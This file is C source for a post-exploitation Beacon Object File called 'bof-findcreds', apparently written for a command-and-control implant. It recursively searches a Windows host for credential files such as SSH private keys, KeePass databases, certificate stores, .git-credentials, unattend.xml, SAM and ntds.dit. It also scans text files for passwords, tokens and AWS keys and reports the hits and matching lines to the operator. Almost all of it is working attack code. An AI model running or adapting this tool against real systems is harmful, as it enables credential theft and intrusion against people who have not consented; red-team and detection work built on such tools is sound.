/*
 * bof-findcreds [root] [max-depth] [regex]
 *
 * Recursively hunt for credential-bearing files under root (default
 * %USERPROFILE%, depth 6).  Flags:
 *   - filenames: .env, id_rsa/id_dsa/id_ecdsa/id_ed25519, *.pem, *.pfx,
 *     *.p12, *.kdbx, *.key, *.ppk, .pgpass, .netrc, .git-credentials,
 *     unattend.xml, web.config, appsettings.json, wp-config.php, *.rdp, *.ovpn
 *   - contents (text files up to 1 MB): "password", "passwd", "api_key",
 *     "apikey", "secret", "token", "aws_access_key_id", "connectionstring",
 *     "BEGIN ... PRIVATE KEY"
 *
 * The optional third argument replaces the built-in content keywords with a
 * small case-insensitive regular expression (literals, ., *, +, ?, [], ^, $,
 * \d \w \s and escapes).  Example:
 *   bof-findcreds C:\Users 8 "(password|passwd|pwd)\s*[:=]"
 *
 * Prints the matching path and, for content hits, the matching line.  This is
 * a triage tool: validate hits before using them.
 */
#include "beacon.h"
#include "bofdefs.h"
#include "helpers.h"

#define FIND_MAX_HITS 200
#define FIND_MAX_FILE (1024u * 1024u)
#define RE_STEP_LIMIT 400000u

static const char *name_patterns[] = {
    ".env", "id_rsa", "id_dsa", "id_ecdsa", "id_ed25519", ".pem", ".pfx",
    ".p12", ".kdbx", ".key", ".ppk", ".pgpass", ".netrc", ".git-credentials",
    "unattend.xml", "web.config", "appsettings.json", "wp-config.php",
    ".rdp", ".ovpn", "credentials", "passwords", "secrets", ".htpasswd",
    "shadow", "sam", "ntds.dit", NULL
};

static const char *content_patterns[] = {
    "password", "passwd", "api_key", "apikey", "secret", "token",
    "aws_access_key_id", "aws_secret_access_key", "connectionstring",
    "private key", "client_secret", NULL
};

static int contains_ci(const unsigned char *buf, unsigned int len, const char *needle)
{
    unsigned int n = (unsigned int)bof_strlen(needle), i;
    if (!n || len < n) return 0;
    for (i = 0; i + n <= len; i++) {
        unsigned int j;
        for (j = 0; j < n; j++) {
            unsigned char a = buf[i + j], b = (unsigned char)needle[j];
            if (a >= 'A' && a <= 'Z') a += 32;
            if (b >= 'A' && b <= 'Z') b += 32;
            if (a != b) break;
        }
        if (j == n) return 1;
    }
    return 0;
}

static int name_hit(const char *name)
{
    int i;
    for (i = 0; name_patterns[i]; i++) {
        const char *p = name_patterns[i];
        int n = bof_strlen(name), m = bof_strlen(p);
        if (bof_stricmp(name, p) == 0) return 1;
        if (n >= m && bof_stricmp(name + n - m, p) == 0) return 1;
    }
    return 0;
}

/* ------------------------------------------------------------------ */
/* tiny regex engine: literals, ., *, +, ?, [], ^, $, \d \w \s        */
/* ------------------------------------------------------------------ */
typedef struct {
    unsigned char bits[32];
    int neg;
} re_class;

typedef struct {
    int kind;              /* 0 lit, 1 any, 2 class */
    unsigned char lit;
    re_class cls;
} re_atom;

typedef struct {
    const unsigned char *s;
    unsigned int len;
    unsigned int steps;
} re_ctx;

static void re_cls_set(re_class *c, unsigned int ch)
{
    c->bits[(ch & 0xff) >> 3] |= (unsigned char)(1u << (ch & 7));
}

static void re_cls_range(re_class *c, unsigned int a, unsigned int b)
{
    unsigned int i;
    if (a > b) return;
    for (i = a; i <= b; i++) re_cls_set(c, i);
}

static void re_cls_digit(re_class *c)
{
    re_cls_range(c, '0', '9');
}

static void re_cls_word(re_class *c)
{
    re_cls_range(c, 'a', 'z');
    re_cls_range(c, 'A', 'Z');
    re_cls_range(c, '0', '9');
    re_cls_set(c, '_');
}

static void re_cls_space(re_class *c)
{
    re_cls_set(c, ' ');
    re_cls_set(c, '\t');
    re_cls_set(c, '\r');
    re_cls_set(c, '\n');
    re_cls_set(c, '\f');
    re_cls_set(c, '\v');
}

static int re_cls_match(const re_class *c, unsigned char ch)
{
    int hit = (c->bits[ch >> 3] >> (ch & 7)) & 1;
    return c->neg ? !hit : hit;
}

/* Parse one atom at p.  Returns pointer after the atom (before any
 * quantifier), or NULL on a malformed pattern. */
static const char *re_atom_parse(const char *p, re_atom *a)
{
    unsigned char ch = (unsigned char)*p;

    bof_memzero(a, sizeof(*a));
    if (ch == '.') {
        a->kind = 1;
        return p + 1;
    }
    if (ch == '\\') {
        p++;
        ch = (unsigned char)*p;
        if (!ch) return NULL;
        a->kind = 2;
        if (ch == 'd') { re_cls_digit(&a->cls); return p + 1; }
        if (ch == 'D') { re_cls_digit(&a->cls); a->cls.neg = 1; return p + 1; }
        if (ch == 'w') { re_cls_word(&a->cls); return p + 1; }
        if (ch == 'W') { re_cls_word(&a->cls); a->cls.neg = 1; return p + 1; }
        if (ch == 's') { re_cls_space(&a->cls); return p + 1; }
        if (ch == 'S') { re_cls_space(&a->cls); a->cls.neg = 1; return p + 1; }
        if (ch == 'n') ch = '\n';
        else if (ch == 'r') ch = '\r';
        else if (ch == 't') ch = '\t';
        a->kind = 0;
        a->lit = ch;
        return p + 1;
    }
    if (ch == '[') {
        int neg = 0, first = 1;
        p++;
        if (*p == '^') { neg = 1; p++; }
        a->kind = 2;
        a->cls.neg = neg;
        while (*p && (*p != ']' || first)) {
            unsigned char lo = (unsigned char)*p, hi;
            first = 0;
            if (lo == '\\' && p[1]) {
                unsigned char e = (unsigned char)p[1];
                p += 2;
                if (e == 'd') { re_cls_digit(&a->cls); continue; }
                if (e == 'w') { re_cls_word(&a->cls); continue; }
                if (e == 's') { re_cls_space(&a->cls); continue; }
                lo = (e == 'n') ? '\n' : (e == 'r') ? '\r' :
                     (e == 't') ? '\t' : e;
            } else {
                p++;
            }
            hi = lo;
            if (*p == '-' && p[1] && p[1] != ']') {
                p++;
                hi = (unsigned char)*p++;
                if (hi == '\\' && *p) {
                    unsigned char e = (unsigned char)*p++;
                    hi = (e == 'n') ? '\n' : (e == 'r') ? '\r' :
                         (e == 't') ? '\t' : e;
                }
            }
            re_cls_range(&a->cls, lo, hi);
            if (lo >= 'a' && lo <= 'z')
                re_cls_range(&a->cls, lo - 32, hi - 32);
            else if (lo >= 'A' && lo <= 'Z')
                re_cls_range(&a->cls, lo + 32, hi + 32);
        }
        if (*p != ']') return NULL;
        return p + 1;
    }
    a->kind = 0;
    a->lit = ch;
    return p + 1;
}

static int re_atom_match(const re_atom *a, unsigned char ch)
{
    if (a->kind == 0) {
        unsigned char x = ch;
        if (a->lit >= 'A' && a->lit <= 'Z') {
            if (x == a->lit + 32 || x == a->lit) return 1;
            return 0;
        }
        if (a->lit >= 'a' && a->lit <= 'z') {
            if (x == a->lit - 32 || x == a->lit) return 1;
            return 0;
        }
        return x == a->lit;
    }
    if (a->kind == 1) return ch != '\n' && ch != '\r';
    return re_cls_match(&a->cls, ch);
}

static int re_here(re_ctx *c, const char *p, unsigned int pos, unsigned int *end)
{
    re_atom a;
    const char *next;
    char quant = 0;

    if (++c->steps > RE_STEP_LIMIT) return 0;
    if (!*p) { *end = pos; return 1; }

    if (*p == '^') {
        if (pos == 0 || c->s[pos - 1] == '\n')
            return re_here(c, p + 1, pos, end);
        return 0;
    }
    if (*p == '$' && p[1] == 0) {
        if (pos == c->len || c->s[pos] == '\n' || c->s[pos] == '\r') {
            *end = pos;
            return 1;
        }
        return 0;
    }
    if (*p == '*' || *p == '+' || *p == '?') return 0;

    next = re_atom_parse(p, &a);
    if (!next) return 0;
    if (*next == '*' || *next == '+' || *next == '?') {
        quant = *next;
        next++;
    }

    if (!quant) {
        if (pos < c->len && re_atom_match(&a, c->s[pos]))
            return re_here(c, next, pos + 1, end);
        return 0;
    }

    if (quant == '?') {
        if (pos < c->len && re_atom_match(&a, c->s[pos]) &&
            re_here(c, next, pos + 1, end))
            return 1;
        return re_here(c, next, pos, end);
    }

    {
        unsigned int max = pos, k;
        while (max < c->len && re_atom_match(&a, c->s[max])) max++;
        if (quant == '+') {
            if (max == pos) return 0;
            for (k = max;; k--) {
                if (re_here(c, next, k, end)) return 1;
                if (k == pos + 1) break;
            }
        } else {
            for (k = max + 1; k-- > pos;) {
                if (re_here(c, next, k, end)) return 1;
                if (k == pos) break;
            }
        }
    }
    return 0;
}

/* Find regex in buf.  Case-insensitive for literals. Returns 1 and match
 * offsets on success. */
static int re_find(const unsigned char *buf, unsigned int len,
                   const char *pat, unsigned int *mstart, unsigned int *mend)
{
    unsigned int pos = 0;
    re_ctx c;

    if (!pat || !pat[0]) return 0;
    c.s = buf;
    c.len = len;
    c.steps = 0;

    /* Literal first-character prefilter. */
    if (pat[0] != '^' && pat[0] != '.' && pat[0] != '[' &&
        pat[0] != '\\' && pat[0] != '*' && pat[0] != '+' && pat[0] != '?') {
        unsigned char want = (unsigned char)pat[0];
        unsigned char wl = want, wu = want;
        if (want >= 'a' && want <= 'z') wu = (unsigned char)(want - 32);
        if (want >= 'A' && want <= 'Z') wl = (unsigned char)(want + 32);
        while (pos < len) {
            if (buf[pos] == wl || buf[pos] == wu) {
                unsigned int end = 0;
                c.steps = 0;
                if (re_here(&c, pat, pos, &end)) {
                    *mstart = pos; *mend = end; return 1;
                }
            }
            pos++;
        }
        return 0;
    }

    for (pos = 0; pos <= len; pos++) {
        unsigned int end = 0;
        c.steps = 0;
        if (re_here(&c, pat, pos, &end)) {
            *mstart = pos; *mend = end;
            return 1;
        }
    }
    return 0;
}

/* ------------------------------------------------------------------ */
/* scanning                                                            */
/* ------------------------------------------------------------------ */
typedef struct {
    int hits;
    int limit;
    const char *regex;
} find_state;

static void print_line(const char *path, const char *needle,
                       const unsigned char *buf, unsigned int len, unsigned int at)
{
    unsigned int s = at, e = at;
    char line[240];
    unsigned int i, o = 0;

    if (at >= len) at = len ? len - 1 : 0;
    s = e = at;
    while (s > 0 && buf[s - 1] != '\n' && buf[s - 1] != '\r') s--;
    while (e < len && buf[e] != '\n' && buf[e] != '\r') e++;
    for (i = s; i < e && o < sizeof(line) - 1; i++) {
        unsigned char c = buf[i];
        line[o++] = (c >= 0x20 && c < 0x7f) ? (char)c : '.';
    }
    line[o] = 0;
    BeaconPrintf(CALLBACK_OUTPUT, "  [content] %s : %s\n      %s\n",
                 needle, path, line);
}

static int scan_file_content(const char *path, find_state *st)
{
    unsigned char *buf = NULL;
    unsigned int len = 0, i;
    int found = 0;

    if (bof_read_file(path, &buf, &len) != 0 || !buf) return 0;
    if (len > FIND_MAX_FILE) {
        KERNEL32$VirtualFree(buf, 0, MEM_RELEASE);
        return 0;
    }
    for (i = 0; i < len && i < 512; i++) {
        if (buf[i] == 0) {                   /* binary, skip content scan */
            KERNEL32$VirtualFree(buf, 0, MEM_RELEASE);
            return 0;
        }
    }

    if (st->regex && st->regex[0]) {
        unsigned int s = 0, e = 0;
        if (re_find(buf, len, st->regex, &s, &e)) {
            print_line(path, "regex", buf, len, s);
            found = 1;
            st->hits++;
        }
        KERNEL32$VirtualFree(buf, 0, MEM_RELEASE);
        return found;
    }

    for (i = 0; content_patterns[i]; i++) {
        unsigned int at = 0;
        if (!contains_ci(buf, len, content_patterns[i])) continue;
        {
            unsigned int n = (unsigned int)bof_strlen(content_patterns[i]), k;
            for (k = 0; k + n <= len; k++) {
                unsigned int j;
                for (j = 0; j < n; j++) {
                    unsigned char a = buf[k + j], b = (unsigned char)content_patterns[i][j];
                    if (a >= 'A' && a <= 'Z') a += 32;
                    if (b >= 'A' && b <= 'Z') b += 32;
                    if (a != b) break;
                }
                if (j == n) { at = k; break; }
            }
        }
        print_line(path, content_patterns[i], buf, len, at);
        found = 1;
        st->hits++;
        if (st->hits >= st->limit) break;
    }
    KERNEL32$VirtualFree(buf, 0, MEM_RELEASE);
    return found;
}

static void scan_path(const char *path, int depth, int maxdepth, find_state *st)
{
    WIN32_FIND_DATAA fd;
    HANDLE h;
    char pattern[MAX_PATH * 2];

    if (st->hits >= st->limit || depth > maxdepth) return;

    bof_strncpy(pattern, path, sizeof(pattern));
    bof_strncat(pattern, "\\*", sizeof(pattern) - bof_strlen(pattern) - 1);
    h = KERNEL32$FindFirstFileA(pattern, &fd);
    if (h == INVALID_HANDLE_VALUE) return;

    do {
        char child[MAX_PATH * 2];
        if (st->hits >= st->limit) break;
        if (bof_strcmp(fd.cFileName, ".") == 0 ||
            bof_strcmp(fd.cFileName, "..") == 0) continue;

        bof_strncpy(child, path, sizeof(child));
        bof_strncat(child, "\\", sizeof(child) - bof_strlen(child) - 1);
        bof_strncat(child, fd.cFileName, sizeof(child) - bof_strlen(child) - 1);

        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            if (fd.dwFileAttributes & FILE_ATTRIBUTE_REPARSE_POINT) continue;
            if (bof_stricmp(fd.cFileName, "System Volume Information") == 0 ||
                bof_stricmp(fd.cFileName, "$Recycle.Bin") == 0 ||
                bof_stricmp(fd.cFileName, "WinSxS") == 0 ||
                bof_stricmp(fd.cFileName, "node_modules") == 0)
                continue;
            scan_path(child, depth + 1, maxdepth, st);
        } else {
            int named = name_hit(fd.cFileName);
            if (named) {
                BeaconPrintf(CALLBACK_OUTPUT, "  [name] %s\n", child);
                st->hits++;
            }
            if (st->hits < st->limit)
                scan_file_content(child, st);
        }
    } while (KERNEL32$FindNextFileA(h, &fd));

    KERNEL32$FindClose(h);
}

void go(char *args, int alen)
{
    datap parser;
    char *root = "";
    char *regex = "";
    int rlen = 0, regexlen = 0, maxdepth = 6;
    char base[MAX_PATH];
    find_state st;

    BeaconDataParse(&parser, args, alen);
    root = BeaconDataExtract(&parser, &rlen);
    {
        int v = BeaconDataInt(&parser);
        if (v > 0 && v <= 12) maxdepth = v;
    }
    regex = BeaconDataExtract(&parser, &regexlen);
    if (!root) root = "";
    if (!regex) regex = "";

    if (root[0]) {
        bof_strncpy(base, root, sizeof(base));
    } else if (!KERNEL32$ExpandEnvironmentStringsA("%USERPROFILE%", base,
                                                   sizeof(base))) {
        BeaconPrintf(CALLBACK_ERROR, "cannot resolve %%USERPROFILE%%\n");
        return;
    }

    bof_memzero(&st, sizeof(st));
    st.limit = FIND_MAX_HITS;
    st.regex = regex;

    BeaconPrintf(CALLBACK_OUTPUT,
                 "================ credential file hunt ================\n");
    BeaconPrintf(CALLBACK_OUTPUT, "[*] root: %s (depth %d)\n", base, maxdepth);
    if (regex[0])
        BeaconPrintf(CALLBACK_OUTPUT, "[*] content regex: %s\n", regex);
    {
        DWORD attr = KERNEL32$GetFileAttributesA(base);
        if (attr != INVALID_FILE_ATTRIBUTES && !(attr & FILE_ATTRIBUTE_DIRECTORY)) {
            const char *slash = base;
            const char *p;
            for (p = base; *p; p++) if (*p == '\\' || *p == '/') slash = p + 1;
            if (name_hit(slash)) {
                BeaconPrintf(CALLBACK_OUTPUT, "  [name] %s\n", base);
                st.hits++;
            }
            scan_file_content(base, &st);
        } else {
            scan_path(base, 0, maxdepth, &st);
        }
    }
    BeaconPrintf(CALLBACK_OUTPUT, "\n[*] %d hit(s)%s\n", st.hits,
                 st.hits >= st.limit ? " (limit reached)" : "");
}
